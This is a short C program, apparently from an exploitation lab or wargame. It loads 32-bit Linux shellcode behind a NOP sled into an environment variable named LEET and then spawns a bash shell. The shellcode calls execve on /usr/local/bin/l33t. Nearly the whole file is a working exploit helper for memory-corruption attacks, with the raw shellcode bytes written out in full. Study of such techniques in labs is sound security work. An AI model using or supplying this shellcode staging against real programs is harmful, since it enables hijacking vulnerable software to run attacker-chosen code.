#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// a large sized buffer makes it easier to write a valid address when writing exploits
#define SIZE 512
#define NOP 0x90

// shellcode to call execve on `/usr/local/bin/l33t`
char shellcode[] =
  "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";

int main(void) {
  char leet[SIZE];
  int shellcode_len = strlen(shellcode);

  // fill-up the buffer with NOP - the NOP sled,
  // then add the shellcode to the end of the buffer
  memset(leet, NOP, SIZE);
  memcpy(&leet[SIZE-shellcode_len], shellcode, shellcode_len);

  // Set LEET env variable to shellcode with NOP sled
  setenv("LEET", leet, 1);
  putenv(leet);

  puts("Loaded l33t shellcode into env as 'LEET'\n");

  system("bash");
  return 0;
}
